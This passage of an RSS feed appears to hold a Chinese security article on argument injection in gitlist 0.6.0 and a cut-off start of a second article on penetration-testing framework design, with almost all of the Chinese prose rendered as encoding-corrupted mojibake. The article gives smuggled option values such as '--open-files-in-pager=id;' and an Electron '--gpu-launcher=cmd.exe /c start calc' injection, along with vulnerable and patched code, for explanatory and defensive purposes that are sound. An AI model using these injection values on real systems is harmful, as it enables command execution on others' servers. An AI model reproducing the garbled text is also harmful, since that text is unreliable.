0.6.0è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´è¯´èµ·&lt;/h2&gt;&lt;p&gt;æˆ‘ä»¬ä»gitlistè¯´èµ·ï¼Œgitlistæ˜¯ä¸€æ¬¾ä½¿ç”¨PHPå¼€å‘çš„å›¾å½¢åŒ–gitä»“åº“æŸ¥çœ‹å·¥å…·ã€‚åœ¨å…¶0.6.0ç‰ˆæœ¬ä¸­ï¼Œå­˜åœ¨ä¸€å¤„å‘½ä»¤å‚æ•°æ³¨å…¥é—®é¢˜ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚&lt;/p&gt;&lt;p&gt;åœ¨ç”¨æˆ·å¯¹ä»“åº“ä¸­ä»£ç è¿›è¡Œæœç´¢çš„æ—¶å€™ï¼Œgitlistå°†è°ƒç”¨&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }
&lt;/code&gt;&lt;p&gt;å…¶ä¸­ï¼Œ&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;æ˜¯æœç´¢çš„å…³é”®å­—ï¼Œ&lt;code class=&quot;inline&quot;&gt;$branch&lt;/code&gt;æ˜¯æœç´¢çš„åˆ†æ”¯ã€‚&lt;/p&gt;&lt;p&gt;å¦‚æœç”¨æˆ·è¾“å…¥çš„&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;çš„å€¼æ˜¯&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;ï¼Œå°†å¯ä»¥æ‰§è¡Œ&lt;code class=&quot;inline&quot;&gt;id&lt;/code&gt;å‘½ä»¤ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-025b25bf8f104854898807714b9dac55_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;665&quot; data-rawheight=&quot;74&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;h2&gt;0x02 escapeshellargä¸ºä»€ä¹ˆæ²¡æœ‰å¥æ•ˆï¼Ÿ&lt;/h2&gt;&lt;p&gt;å¯¼è‡´è¿™ä¸ªæ¼æ´çš„åŸå› ï¼Œæœ‰å‡ ç‚¹ï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;å¼€å‘è€…å¯¹äº&lt;code class=&quot;inline&quot;&gt;escapeshellarg&lt;/code&gt;å‡½æ•°çš„è¯¯è§£ï¼Œé€ æˆå‚æ•°æ³¨å…¥&lt;/li&gt;&lt;li&gt;&lt;code class=&quot;inline&quot;&gt;git grep&lt;/code&gt;çš„å‚æ•°&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;çš„å€¼ï¼Œå°†è¢«ç›´æ¥æ‰§è¡Œ&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;ç†è®ºä¸Šï¼Œåœ¨ç»è¿‡&lt;code class=&quot;inline&quot;&gt;$query = escapeshellarg($query);&lt;/code&gt;å¤„ç†åï¼Œ&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;å°†å˜æˆä¸€ä¸ªç”±å•å¼•å·åŒ…è£¹çš„å­—ç¬¦ä¸²ã€‚ä½†ä¸å‡ºæ¼æ´çš„å‰ææ˜¯ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åº”è¯¥å‡ºç°åœ¨â€œå‚æ•°å€¼â€çš„ä½ç½®ï¼Œè€Œä¸æ˜¯å‡ºç°åœ¨å‚æ•°é€‰é¡¹ï¼ˆoptionï¼‰ä¸­ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ä»¬å¯ä»¥è¯•ä¸€ä¸‹å¦‚ä¸‹å‘½ä»¤ï¼š&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;git grep -i --line-number -e &#39;--open-files-in-pager=id;&#39; master&lt;/code&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9e039e85772fc4b3f1b3116e17c215c5_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;700&quot; data-rawheight=&quot;168&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-9e039e85772fc4b3f1b3116e17c215c5&quot; data-watermark-src=&quot;v2-c6f61d88a48b22311344485e716be6ab&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å¦‚ä¸Šå›¾ï¼Œæˆ‘å°†&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;æ”¾åœ¨äº†&lt;code class=&quot;inline&quot;&gt;-e&lt;/code&gt;å‚æ•°çš„å€¼çš„ä½ç½®ï¼Œæ­¤æ—¶å®ƒå°±ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²è€Œå·²ï¼Œå¹¶ä¸ä¼šè¢«å½“æˆå‚æ•°&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager&lt;/code&gt;ã€‚&lt;/p&gt;&lt;p&gt;è¿™åº”è¯¥ä½œä¸ºæœ¬æ¼æ´çš„æœ€ä½³ä¿®å¤æ–¹æ³•ï¼Œä¹Ÿæ˜¯gitå®˜æ–¹å¯¹patternå¯èƒ½æ˜¯ç”¨æˆ·è¾“å…¥çš„æƒ…å†µçš„ä¸€ç§è§£å†³æ–¹æ¡ˆï¼ˆä»¥ä¸‹è¯´æ˜æ¥è‡ªman-pageï¼‰ï¼š&lt;/p&gt;&lt;blockquote&gt;-e &lt;br&gt;The next parameter is the pattern. This option has to be used for patterns starting with - and should be used in scripts passing user input to grep. Multiple patterns are combined by&lt;br&gt;or.&lt;/blockquote&gt;&lt;p&gt;å½“ç„¶ï¼Œgitlistçš„å¼€å‘è€…ç”¨äº†å¦ä¸€ç§ä¿®å¤æ–¹æ¡ˆï¼š&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;&amp;lt;?php
public function searchTree($query, $branch)
{
    if (empty($query)) {
        return null;
    }
    $query = preg_replace(&#39;/(--?[A-Za-z0-9\-]+)/&#39;, &#39;&#39;, $query);
    $query = escapeshellarg($query);
    try {
        $results = $this-&amp;gt;getClient()-&amp;gt;run($this, &quot;grep -i --line-number -- {$query} $branch&quot;);
    } catch (\RuntimeException $e) {
        return false;
    }&lt;/code&gt;&lt;p&gt;é¦–å…ˆç”¨&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;å°†&lt;code class=&quot;inline&quot;&gt;-&lt;/code&gt;å¼€å¤´çš„éæ³•å­—ç¬¦ç§»é™¤ï¼Œç„¶åå°†&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;æ‹¼æ¥åœ¨&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;çš„åé¢ã€‚&lt;/p&gt;&lt;p&gt;åœ¨å‘½ä»¤è¡Œè§£æå™¨ä¸­ï¼Œ&lt;code class=&quot;inline&quot;&gt;--&lt;/code&gt;çš„æ„æ€æ˜¯ï¼Œæ­¤åçš„éƒ¨åˆ†ä¸ä¼šå†åŒ…å«å‚æ•°é€‰é¡¹ï¼ˆoptionï¼‰ï¼š&lt;/p&gt;&lt;blockquote&gt;A -- signals the end of options and disables further option processing. Any arguments after the -- are treated as filenames and arguments. An argument of - is equivalent to --.&lt;br&gt;If arguments remain after option processing, and neither the -c nor the -s option has been supplied, the first argument is assumed to be the name of a file containing shell commands. If bash is invoked in this fashion, $0 is set to the name of the file, and the positional parameters are set to the remaining arguments. Bash reads and executes commands from this file, then exits. Bash&#39;s exit status is the exit status of the last command executed in the script. If no commands are executed, the exit status is 0. An attempt is first made to open the file in the current directory, and, if no file is found, then the shell searches the directories in PATH for the script.&lt;/blockquote&gt;&lt;p&gt;ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦æŸ¥çœ‹ä¸€ä¸ªæ–‡ä»¶åæ˜¯&lt;code class=&quot;inline&quot;&gt;--name&lt;/code&gt;çš„æ–‡ä»¶ï¼Œæˆ‘ä»¬å°±ä¸èƒ½ç”¨&lt;code class=&quot;inline&quot;&gt;cat --name&lt;/code&gt;æ¥è¯»å–ï¼Œä¹Ÿä¸èƒ½ç”¨&lt;code class=&quot;inline&quot;&gt;cat &#39;--name&#39;&lt;/code&gt;ï¼Œè€Œå¿…é¡»è¦ç”¨&lt;code class=&quot;inline&quot;&gt;cat -- --name&lt;/code&gt;ã€‚ä»è¿™ä¸ªä¾‹å­ä¹Ÿèƒ½çœ‹å‡ºï¼Œå•å¼•å·å¹¶ä¸æ˜¯åŒºåˆ†ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯â€œå‚æ•°å€¼â€æˆ–â€œé€‰é¡¹â€çš„æ ‡å‡†ã€‚&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-294baf61c56ec7cfecbf9d00ddfb1ecc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;471&quot; data-rawheight=&quot;215&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-294baf61c56ec7cfecbf9d00ddfb1ecc&quot; data-watermark-src=&quot;v2-288a066ec9e202cacdac47f1babf7524&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;æ‰€ä»¥å®˜æ–¹è¿™ä¸ªä¿®å¤æ–¹æ¡ˆä¹Ÿæ˜¯å¯ä»¥æ¥å—çš„ï¼Œåªä¸è¿‡ç¬¬ä¸€æ­¥çš„&lt;code class=&quot;inline&quot;&gt;preg_replace&lt;/code&gt;æœ‰ç‚¹å½±å“æ­£å¸¸æœç´¢åŠŸèƒ½ã€‚&lt;/p&gt;&lt;h2&gt;0x03 è¿™ä¸æ˜¯PHPçš„ä¸“åˆ©&lt;/h2&gt;&lt;p&gt;ç†Ÿæ‚‰PHPè¯­è¨€çš„åŒå­¦ä¸€å®šå¯¹PHPæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•æ„Ÿå—æ·±åˆ»ï¼ŒPHPå†…ç½®çš„å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆå¦‚&lt;code class=&quot;inline&quot;&gt;shell_exec&lt;/code&gt;ã€&lt;code class=&quot;inline&quot;&gt;system&lt;/code&gt;ï¼‰ï¼Œéƒ½åªæ¥å—ä¸€ä¸ªâ€œå­—ç¬¦ä¸²â€ä½œä¸ºå‚æ•°ã€‚è€Œåœ¨å†…æ ¸ä¸­ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²å°†è¢«ç›´æ¥ä½œä¸ºä¸€æ¡shellå‘½ä»¤æ¥è°ƒç”¨ï¼Œè¿™ç§æƒ…å†µä¸‹å°±æä¸ºå®¹æ˜“å‡ºç°å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚&lt;/p&gt;&lt;p&gt;ç”±äºè¿™ä¸ªç‰¹ç‚¹ï¼ŒPHPç‰¹åˆ«å‡†å¤‡äº†ä¸¤ä¸ªè¿‡æ»¤å‡½æ•°ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;escapeshellcmd&lt;/li&gt;&lt;li&gt;escapeshellarg&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;äºŒè€…åˆ†å·¥ä¸åŒï¼Œå‰è€…ä¸ºäº†é˜²æ­¢ç”¨æˆ·åˆ©ç”¨shellçš„ä¸€äº›æŠ€å·§ï¼ˆå¦‚åˆ†å·ã€åå¼•å·ç­‰ï¼‰ï¼Œæ‰§è¡Œå…¶ä»–å‘½ä»¤ï¼›åè€…æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·çš„è¾“å…¥é€ƒé€¸å‡ºâ€œå‚æ•°å€¼â€çš„ä½ç½®ï¼Œå˜æˆä¸€ä¸ªâ€œå‚æ•°é€‰é¡¹â€ã€‚&lt;/p&gt;&lt;p&gt;ä½†æˆ‘åœ¨0x02ä¸­ä¹Ÿå·²ç»è¯´æ¸…æ¥šäº†ï¼Œå¦‚æœå¼€å‘è€…åœ¨æ‹¼æ¥å‘½ä»¤çš„æ—¶å€™ï¼Œå°†&lt;code class=&quot;inline&quot;&gt;$query&lt;/code&gt;ç›´æ¥ç»™æ‹¼æ¥åœ¨â€œå‚æ•°é€‰é¡¹â€çš„ä½ç½®ä¸Šï¼Œé‚£ç”¨escapeshellargä¹Ÿå°±æ²¡ä»»ä½•æ•ˆæœäº†ã€‚&lt;/p&gt;&lt;p&gt;Javaã€Pythonç­‰è¯­è¨€ï¼Œæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•ç›¸å¯¹æ¥è¯´æ›´åŠ ä¼˜é›…ï¼š&lt;/p&gt;&lt;code lang=&quot;python&quot;&gt;import subprocess

query = &#39;id&#39;
r = subprocess.run([&#39;git&#39;, &#39;grep&#39;, &#39;-i&#39;, &#39;--line-number&#39;, query, &#39;master&#39;], cwd=&#39;/tmp/vulhub&#39;)&lt;/code&gt;&lt;p&gt;é»˜è®¤æƒ…å†µä¸‹ï¼Œpythonçš„subprocessæ¥å—çš„æ˜¯ä¸€ä¸ªåˆ—è¡¨ã€‚æˆ‘ä»¬å¯ä»¥å°†ç”¨æˆ·è¾“å…¥çš„queryæ”¾åœ¨åˆ—è¡¨çš„ä¸€é¡¹ï¼Œè¿™æ ·ä¹Ÿå°±é¿å…äº†å¼€å‘è€…æ‰‹å·¥è½¬ä¹‰queryçš„å·¥ä½œï¼Œä¹Ÿèƒ½ä»æ ¹æœ¬ä¸Šé˜²å¾¡å‘½ä»¤æ³¨å…¥æ¼æ´ã€‚ä½†å¯æƒœçš„æ˜¯ï¼Œpythonå¸®å¼€å‘è€…åšçš„æ“ä½œï¼Œä¹Ÿä»…ä»…ç›¸å½“äºæ˜¯PHPä¸­çš„escapeshellargã€‚æˆ‘ä»¬å¯ä»¥è¯•è¯•ä»¤queryç­‰äº&lt;code class=&quot;inline&quot;&gt;--open-files-in-pager=id;&lt;/code&gt;ï¼š&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-60e865d895273fd01be970c244f0dcca_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;794&quot; data-rawheight=&quot;176&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-60e865d895273fd01be970c244f0dcca&quot; data-watermark-src=&quot;v2-57cc73211fb0b0cb22c5fef181756722&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;å¯è§ï¼Œä»ç„¶æ˜¯å­˜åœ¨å‚æ•°æ³¨å…¥æ¼æ´çš„ã€‚åŸå› è¿˜æ˜¯0x02ä¸­è¯´çš„åŸå› ï¼Œä½ æŠŠqueryæ”¾åœ¨äº†â€œå‚æ•°é€‰é¡¹â€çš„ä½ç½®ä¸Šï¼Œæ— è®ºæ€ä¹ˆè¿‡æ»¤ï¼Œæˆ–è€…æ¢æˆå…¶ä»–è¯­è¨€ï¼Œéƒ½ä¸å¯èƒ½è§£å†³é—®é¢˜ã€‚&lt;/p&gt;&lt;h2&gt;0x04 ä¸¾ä¸€åä¸‰&lt;/h2&gt;&lt;p&gt;å‚æ•°æ³¨å…¥çš„ä¾‹å­è¿˜æ¯”è¾ƒå¤šï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„å¼€å‘è€…éƒ½èƒ½ç†è§£å‘½ä»¤æ³¨å…¥çš„åŸç†ï¼Œä½†å¤„ç†äº†å‘½ä»¤æ³¨å…¥åï¼Œå¾€å¾€éƒ½ä¼šå¿½ç•¥å‚æ•°æ³¨å…¥çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;æœ€å…¸å‹æ˜¯æ¡ˆä¾‹æ˜¯&lt;a href=&quot;https://github.com/vulhub/vulhub/blob/master/wordpress/pwnscriptum/README.md&quot;&gt;Wordpress PwnScriptumæ¼æ´&lt;/a&gt;ï¼ŒPHP mailå‡½æ•°çš„ç¬¬äº”ä¸ªå‚æ•°ï¼Œå…è®¸ç›´æ¥æ³¨å…¥å‚æ•°ï¼Œç”¨æˆ·é€šè¿‡æ³¨å…¥&lt;code class=&quot;inline&quot;&gt;-X&lt;/code&gt;å‚æ•°ï¼Œå¯¼è‡´å†™å…¥ä»»æ„æ–‡ä»¶ï¼Œæœ€ç»ˆgetshellã€‚&lt;/p&gt;&lt;p&gt;å¦ä¸€ä¸ªå…¸å‹çš„ä¾‹å­æ˜¯&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/php/CVE-2012-1823&quot;&gt;php-cgi CVE-2012-1823&lt;/a&gt; ï¼Œåœ¨cgiæ¨¡å¼ä¸­ï¼Œç”¨æˆ·ä¼ å…¥çš„querystringå°†ä½œä¸ºcgiçš„å‚æ•°ä¼ ç»™php-cgiå‘½ä»¤ã€‚è€Œphp-cgiå‘½ä»¤å¯ä»¥ç”¨-då‚æ•°æŒ‡å®šé…ç½®é¡¹ï¼Œæˆ‘ä»¬é€šè¿‡æŒ‡å®š&lt;code class=&quot;inline&quot;&gt;auto_prepend_file=php://input&lt;/code&gt;ï¼Œæœ€ç»ˆå¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚&lt;/p&gt;&lt;p&gt;å®¢æˆ·ç«¯ä¸Šä¹Ÿå‡ºç°è¿‡ç±»ä¼¼çš„æ¼æ´ï¼Œæ¯”å¦‚&lt;a href=&quot;https://github.com/vulhub/vulhub/tree/master/electron/CVE-2018-1000006&quot;&gt;Electron CVE-2018-1000006&lt;/a&gt;ï¼Œæˆ‘ä»¬é€šè¿‡æ³¨å…¥å‚æ•°&lt;code class=&quot;inline&quot;&gt;--gpu-launcher=cmd.exe /c start calc&lt;/code&gt;ï¼Œæ¥è®©electronå†…ç½®çš„chromiumæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚electronçš„æœ€æ—©ç»™å‡ºçš„ç¼“è§£æªæ–½ä¹Ÿæ˜¯åœ¨æ‹¼æ¥ç‚¹å‰é¢åŠ ä¸Šâ€œ--â€ã€‚&lt;/p&gt;</description>
<author>å‘¨ä½©é›¨</author>
<guid isPermaLink="false">2018-05-08-36591451</guid>
<pubDate>Tue, 08 May 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>æµ…è°ˆåˆ†å¸ƒå¼æ¸—é€æµ‹è¯•æ¡†æ¶çš„è½åœ°å®è·µ</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-04-16-35751510.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/35751510&quot;&gt;åŸæ–‡&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-75d02d21eee1d643ab4ad34ea0c0bd33_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;ä½œè€…ï¼š &lt;a class=&quot;member_mention&quot; href=&quot;http://www.zhihu.com/people/af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hash=&quot;af8bd4cc442c1349ed0f46baff19e3fd&quot; data-hovercard=&quot;p$b$af8bd4cc442c1349ed0f46baff19e3fd&quot;&gt;@v1ll4n&lt;/a&gt; &lt;/p&gt;&lt;p&gt;å®‰å…¨ç ”å‘å·¥ç¨‹å¸ˆï¼Œç°å°±èŒäºé•¿äº­ç§‘æŠ€ï¼Œå–œæ¬¢å–µå–µ&lt;/p&gt;&lt;blockquote&gt;â€œæœ¬æ–‡è¯»èµ·æ¥ä¾æ—§è¿˜æ˜¯éå¸¸æ¯ç‡¥â€&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x00 Intro&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;æœ¬æ–‡åŸºäºä¸Šä¸€ç¯‡æ–‡ç« &lt;a href=&quot;https://zhuanlan.zhihu.com/p/28781870&quot;&gt;ã€Šæµ…è°ˆåˆ†å¸ƒå¼æ¸—é€æ¡†æ¶çš„æ¶æ„ä¸è®¾è®¡ã€‹&lt;/a&gt;çš„å†…å®¹ï¼Œå¹¶ä¸”å®è·µäº†åœ¨ä¸Šä¸€ç¯‡æ–‡ç« ä¸­æåˆ°çš„å„ç§æƒ³æ³•å’Œè®¾è®¡ï¼Œå‹‰å‹‰å¼ºå¼ºç®—æ˜¯è½åœ°å®ç°ã€‚å½“ç„¶æ„æ–™ä¹‹ä¸­åœ°ä¼šé‡åˆ°å„ç§å„æ ·çš„é—®é¢˜ï¼Œä¸ç®¡æœ€åè§£å†³æ–¹æ¡ˆæ˜¯ä¼˜é›…è¿˜æ˜¯ä¸‘é™‹ï¼Œå¯¹ä»Šåçš„å·¥ä½œå’Œå…´è¶£å¼€å‘éƒ½æ˜¯å¾ˆæœ‰ç›Šçš„ç»éªŒç§¯ç´¯ã€‚æœ¬æ–‡å°±ç®€å•è°ˆä¸€äº›å…³äºé¡¹ç›®ç ”å‘è½åœ°å®è·µå‡ºç°çš„å„ç§çŸ›ç›¾å’Œå¯ç¤ºã€‚&lt;/p&gt;&lt;p&gt;&lt;b&gt;Quick Look&lt;/b&gt;ï¼š&lt;/p&gt;&lt;ul&gt;&lt;li&gt;ä¸šåŠ¡éœ€æ±‚æ¨¡å‹ç‰¹å¼‚æ€§ vs åŸå§‹æ•°æ®å¤šæ ·æ€§&lt;/li&gt;&lt;li&gt;ç³»ç»Ÿè®¾è®¡ä¼ªéœ€æ±‚ vs Over-Designed&lt;/li&gt;&lt;li&gt;Service-Oriented Architecture vs è€¦åˆç—›ç‚¹&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;ä»¥ä¸Šå‡ ä¸ªè¯é¢˜åœ¨ä¸‹é¢çš„æ–‡ç« ä¸­éƒ½ä¼šæ¶‰åŠåˆ°ï¼Œå¹¶æ²¡æœ‰å…ˆåé¡ºåºã€‚&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0x01 ä¸šåŠ¡éœ€æ±‚æ¨¡å‹ç‰¹å¼‚æ€§ vs åŸå§‹æ•°æ®å¤šæ ·æ€§&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;åœ¨é¡¹ç›®ä¸­ï¼Œä¸šåŠ¡åˆ›é€ ç›´æ¥çš„ä»·å€¼ï¼Œå„ç§ç”¨æˆ·æ¥å£å’Œç›¸å…³äº¤äº’éƒ½æ˜¯å»ºç«‹åœ¨ä¸šåŠ¡çš„åŸºç¡€ä¸Šçš„ï¼›ç„¶è€Œæˆ‘ä»¬éƒ½çŸ¥é“ï¼Œåœ¨æˆ‘ä»¬æ–‡ç« ä¸­çš„è¿™ç±»ç³»ç»Ÿæœ‰ä¸€ä¸ªå¾ˆå¤§çš„ç‰¹ç‚¹ï¼šåŸå§‹æ•°æ®å¤šä¸”å¤æ‚ï¼Œè€Œä¸”éšç€åŠŸèƒ½å•å…ƒçš„å¢åŠ ï¼Œå¦‚æœæƒ³è¦æ¯ä¸€ä¸ªåŠŸèƒ½å•å…ƒäº§ç”Ÿçš„ç»“æœéƒ½èƒ½å¾—åˆ°å¦¥å–„å¤„ç†ï¼Œæˆ‘è®¤ä¸ºæœ‰ä¸¤ç§è§£å†³æ–¹æ¡ˆï¼š&lt;/p&gt;&lt;ol&gt;&lt;li&gt;Formatter æˆ– API åå®šï¼šä¸ºæ¯ä¸€ä¸ªåŠŸèƒ½å•å…ƒçš„ç»“æœï¼ˆä¸ºæ¯ä¸€ç±»ç»“æœï¼‰éƒ½è®¾å®šä¸€ä¸ª Formatter å»ç›´æ¥è½¬æ¢ä¸ºä¸šåŠ¡éœ€æ±‚çš„ç»“æœï¼›æˆ–è€…ä¸åŸå§‹æ•°æ®çº¦å®š APIã€‚&lt;/li&gt;&lt;li&gt;æ•°æ®è½¬æ¢åè®®æˆ–æ•°æ®è·å–åè®®ï¼šè®¾å®šæ•°æ®è½¬æ¢åè®®æˆ–æ•°æ®è·å–åè®®ï¼ŒProducer å’Œ Consumer åŒæ—¶éµå®ˆä¸€å®šè§„èŒƒï¼ŒProducer ä¸éœ€è¦å…³å¿ƒ Consumer åˆ°åº•æƒ³è¦ä»€ä¹ˆæ ·çš„æ¨¡å‹ï¼Œä»–åªæä¾›ç¬¦åˆåè®®çš„ä¸­é—´æ¨¡å‹ï¼ŒåŒæ ·ï¼Œ Consumer ä¸å…³å¿ƒæ¥å£æ€ä¹ˆæ ·ï¼Œä»–æƒ³è¦çš„åœ¨ä¸­é—´æ¨¡å‹ä¸­éƒ½å¯ä»¥æ‹¿å¾—åˆ°ã€‚&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;è¿™ä¸¤ç§æ–¹æ¡ˆéƒ½å¯ä»¥ä¸€å®šç¨‹åº¦ä¸Šç¼“è§£ &lt;b&gt;ä¸šåŠ¡éœ€æ±‚æ¨¡å‹ç‰¹å¼‚æ€§ä¸åŸå§‹æ•°æ®å¤šæ ·æ€§ä¹‹é—´çš„çŸ›ç›¾&lt;/b&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Formatter æˆ– API åå®š&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Qï¼šä¸ºä»€ä¹ˆè¿™ä¸¤ç§æ–¹å¼ä¼šè¢«å¹¶åˆ—æ¥è®²ï¼Ÿæœ‰ä»€ä¹ˆå…³è”å—ï¼Ÿ&lt;/p&gt;&lt;p&gt;Aï¼šä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œè¿™ä¸¤ç§æ–¹å¼éƒ½æ˜¯å¤šæ ·æ€§å‘ç‰¹å¼‚æ€§å¦¥åè€Œäº§ç”Ÿçš„è§£å†³æ–¹æ¡ˆã€‚ä½•è°“â€œå¦¥åâ€ï¼Ÿä¸éœ€æ±‚æ–¹æ²Ÿé€šæˆ–è€…åå•†å…¶å®å°±å·²ç»ç®—æ˜¯å¦¥åäº†ã€‚å½“ç„¶è¿™å¹¶ä¸æ˜¯è¯´å¦¥åä¸å¥½ï¼Œæ¯•ç«Ÿæ²Ÿé€šæˆæœ¬ä¹Ÿæ˜¯ä¸€å¤§æˆæœ¬ã€‚&lt;/p&gt;&lt;p&gt;å€¼å¾—å¦å¤–æçš„æ˜¯ï¼Œä¸šåŠ¡çš„éœ€æ±‚æ–¹å¹¶ä¸ä¸€å®šæ˜¯åç«¯çš„ç”¨æˆ·æ¥å£å±‚ï¼Œå½“ç„¶åŸå§‹æ•°æ®çš„ç”Ÿäº§è€…ä¹Ÿå¹¶ä¸ä¸€å®šæ˜¯æ•´ä¸ªç³»ç»Ÿçš„åº•å±‚ï¼šè¿™æ ·çš„çŸ›ç›¾ä¹ŸåŒæ ·å­˜åœ¨äºå‰åç«¯ã€‚ä¼ ç»Ÿçš„å‰åç«¯å¼€å‘ï¼Œéœ€è¦ä¸€å®šçš„ API è§„èŒƒï¼ˆå¯èƒ½ä½¿ç”¨ Swagger å»è§„èŒƒ Rest APIï¼‰å»å¤„ç†å‰ç«¯ä¸šåŠ¡ä¸åç«¯åŸå§‹æ•°æ®çš„é€‚é…ï¼Œå‰ç«¯éœ€è¦çš„æ¨¡å‹çš„ç‰¹å¼‚æ€§åŒæ ·ä¼šå’Œåç«¯æä¾›åŸå§‹æ•°æ®äº§ç”ŸçŸ›ç›¾ã€‚&lt;/p&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡è™½ç„¶è¯´ Rest API æˆ–è€…å…¶ä»–ä»€ä¹ˆçš„æ–¹æ¡ˆä¼šè§£å†³ä¸€éƒ¨åˆ†è¿™ç±»å‰åç«¯åä½œå¼€å‘ä¸Šçš„é—®é¢˜ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªéšè—çŸ›ç›¾æ˜¯å¾ˆéš¾å¤„ç†çš„ï¼Œä¹Ÿä¼šä¸Šè¿™ä¸€ä¸ªçŸ›ç›¾æ›´åŠ ä¸¥é‡ï¼š&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ—¥ç›Šå¢é•¿çš„å®¢æˆ·ä¸šåŠ¡æ–¹éœ€æ±‚ä¸ç°é˜¶æ®µæ—§çš„æ¨¡å‹ä¹‹é—´çŸ›ç›¾&lt;/b&gt;&lt;/p&gt;&lt;p&gt;å…¶å®çº¦å®šå›ºå®šçš„æ¨¡å‹ API æˆ–è€…ç¼–å†™å›ºå®š Formatter è¿™ç§æ–¹å¼ï¼Œæ˜¯å¾ˆéš¾è§£å†³éœ€æ±‚å¢é•¿å¯¼è‡´çš„ç‰¹å¼‚æ€§åŠ é‡çš„é—®é¢˜çš„ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼š&lt;/p&gt;&lt;p&gt;&lt;b&gt;æ–°çš„éœ€æ±‚ &amp;gt;&amp;gt; æ–°çš„ API &amp;gt;&amp;gt; æ–°çš„æ²Ÿé€šä¸åå•†&lt;/b&gt;&lt;/p&gt;&lt;p&gt;æˆ‘ç›¸ä¿¡ï¼Œæ¯ä¸ª Coder éƒ½æ¯”è¾ƒæƒ³ç 